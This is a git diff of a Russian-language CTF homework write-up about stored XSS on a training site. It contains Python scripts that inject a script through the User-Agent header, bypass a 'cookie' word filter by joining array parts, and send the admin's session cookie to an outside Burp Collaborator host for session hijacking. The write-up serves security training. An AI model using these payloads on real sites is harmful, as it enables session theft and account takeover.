@@ -1,138 +1,55 @@
 # Forbidden_Code_HW
 
-При входе на сайт видим форму для входа/регистрации
+## Разведка на предмет XSS
+При входе на сайт видем форму входа, а так же возможность зарегестрироваться. Создаём аккаунт с произвольными паролем и логином
 
-![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240312215659.png?raw=true)
+![](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/c6f1688f-21af-417f-84f7-aa1078916318)
 
-При изучении страницы HTML находим подсказку о POST-запросе
+На странице аккаунта можно увидеть, что ведётся логирование неудачных попыток входа в профиль. Попробуем проверить сайт на наличие XSS уязвимости, путём
+указания в качестве User-Agent пейлоад `<script>alert(0)</script>`
 
-![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240312220201.png?raw=true)
+![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/c5f378e0-f722-4deb-9907-7c0f36b820c5)
 
-В личном кабинете можно найти логи неудачных попыток входа. После неудачной попытки входа получаем такую картину
+Уязвимость XSS действительно присутствует, получаем результат:
 
-![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240312220022.png?raw=true)
+![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/545f0980-f419-4afd-a1ba-bf77c1ee4f29)
 
-Регистрируем пользователя с именем `<script>alert(1)</script>` для проверки XSS payload. Получаем:
+## Эксплуатация XSS уязвимости с помощью BurpSuite инструмента Collaborator
 
-![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240312220615.png?raw=true)
+Для кражи файлов cookie, необходимо украсть значение `document.cookie`. При попытке вывести значение напрямую с помощью `alert(document.cookie)` сталкиваемся с тем,
+что на сервере установлена фильтрация на слово 'cookie'
 
->XSS, или межсайтовый скриптинг, — это тип атаки на веб-приложения, при котором злоумышленник может внедрять в содержимое веб-страницы вредоносный скрипт, который будет выполняться на стороне клиента. Это может привести к краже данных, сессий или даже полному контролю над учетной записью жертвы. Рассмотрим возможные пути кражи аккаунта через XSS и методологию предотвращения таких атак.
+![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/8d25f0a8-4bc8-4879-808d-7256e03fc6b4)
 
-## Подготовка атаки
-Изменить логин admin на payload нельзя. На поле id, username, IP, Date мы повлиять не можем, они генерируются на сервере, а вот на User-Agent можем. Напишем скрипт на python для этого:
+Обходим фильтрацию путём разбиения слова cookie на две части одного массива. А так же поднимаем сервер с помощью инструмента collaborator в Burpsuite
 
+![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/96e0ed20-05a1-4030-97c7-8948a6186961)
+
+Скрипт для отправки запроса на python.
 ```python
 import requests
 
-payload = "<script>alert(1);</script>" # это пейлоад
-
-user = "asdf" #Тут наш username
-headers = {'User-Agent': payload} # Вставляем его в хедер
+payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://urp3un99hbcf34xlr31cxw4h78dz1qpf.oastify.com/?${vv}=` + document[vv]; fetch(payload);</script>'
+#vv - массив, состоящий из элементов "coo" и "kie" для обхода фильтрации
+user = "admin" # ставим admin так как именно его cookie крадём
+headers = {'User-Agent': payload}
 data = {"username":user, "password":"aboba"}
 
 
-response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data) # Совершаем попытку логина с неверным паролем
+response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
  
-print(response.status_code)# Выводим информацию
-#print(response.text) 
+print(response.status_code)
 ```
-Проверка скрипта прошла успешно:
+После отправки запроса переходим в BurpSuite, видим сохранённые cookie админ-сессии
 
-![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240312231514.png?raw=true)
+![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/2536c715-2e4a-4784-8a96-a4b252c8f421)
 
-## Проработка атаки с помощью BurpSuite Pro (конечно же купленного)
+Подставляем их в качестве своих значений:
 
-После поиска в гугл по запросу "XSS steal cookie payloads" и изучения результатов понимаем что нам нужно захватить ```document.cookie``` **значение**.
+![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/213e2ab8-c41e-4549-b6fd-8bc404e7da9c)
 
-Пробуем простой alert();
+Результат:
 
-````python 
-import requests
-
-
-payload = '<script>alert(document.cookie);</script>'
-
-user = "asdf" 
-headers = {'User-Agent': payload}
-data = {"username":user, "password":"aboba"}
-
-
-response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
- 
-print(response.status_code)
-print(response.text)
-````
-И встречаем проблему
-![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313002008.png?raw=true)
-
-На сайте стоит фильтр на слово ```cookie```
-
-##Обход фильтрации
-
-Не забываем, что у нас есть неограниченный доступ к **javascript** на клиентской части.
-в функции alert() нам нужно вывести document.cookie.
-Собираем слово cookie из элементов массива
-````javascript
-const vv = ["coo", "kie"].join(""); # передаем его раздельно и с помощью join собираем в одно слово
-alert(document[vv]); # не забываем что document это обьект, и к его значениям можно обращаться не только через точку, но и через [значение]
-````
-Пробуем этот payload.
-````python 
-import requests
-
-
-payload = '<script>const vv = ["coo", "kie"].join("");alert(document[vv]);</script>'
-
-user = "asdf" 
-headers = {'User-Agent': payload}
-data = {"username":user, "password":"aboba"}
-
-
-response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
- 
-print(response.status_code)
-print(response.text)
-````
-Получаем результат
-![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313002825.png?raw=true)
-
-Вспоминаем зачем нам потребовался коллаборатор в бурпе.
-Данное значение, которое только вывели в alert, мы будем ловить на его **сервер**.
-
-![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313003642.png?raw=true)
-
-1) Переходим в вкладку
-2) Копируем **url**
-3) Переходим по ней в google
-4) Нажимаем **Poll now**, чтобы получить с сервера данные.
-
-Эта функция заменит нам ngrok или свой белый IP и сервер, очень удобно.
-Копируем и вставляем в скрипт.
-
-
-````python 
-import requests
-
-
-payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://{{СЮДА}}/?${vv}=` + document[vv]; fetch(payload);</script>'
-
-user = "admin" 
-headers = {'User-Agent': payload}
-data = {"username":user, "password":"aboba"}
-
-
-response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
- 
-print(response.status_code)
-print(response.text)
-````
-Отправляем, ждем, пуллим.
-
-![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313004232.png?raw=true)
-
-Подставим значение PHPSESSID в наш браузер. 
-![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313004351.png?raw=true)
-
-![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Pasted%20image%2020240313004408.png?raw=true)
+![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/7e7b4c4c-642e-423d-9c5f-a7f1f5c5837f)
 
 Получаем флаг: ***CODEBY{m1ss_th3_cl13nt_att4cks?}***
